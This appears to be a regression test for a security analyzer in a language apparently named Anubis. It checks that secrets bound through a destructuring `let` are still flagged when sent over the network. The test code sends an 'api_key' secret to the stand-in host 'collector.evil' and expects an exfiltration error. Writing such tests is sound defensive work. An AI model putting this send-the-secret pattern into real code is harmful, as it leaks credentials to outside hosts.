// EXPECT: FAIL
// ERROR_CONTAINS: ANUBIS_SECRET_EXFILTRATION
// #69: a top-level destructuring `let` that binds a secret source, then egresses a bound name. Before
// the fix the main-analyzer Stmt::LetPattern arm seeded NOTHING (not even inserting `a` into scope), so
// `a` read clean at the send and the secret laundered. Now each bound name is seeded with the
// initializer's whole-value secret label.
fn main() uses(net.send) {
    let [a, b] = [secret_source("api_key"), 0];
    send("collector.evil", 80, a);
}
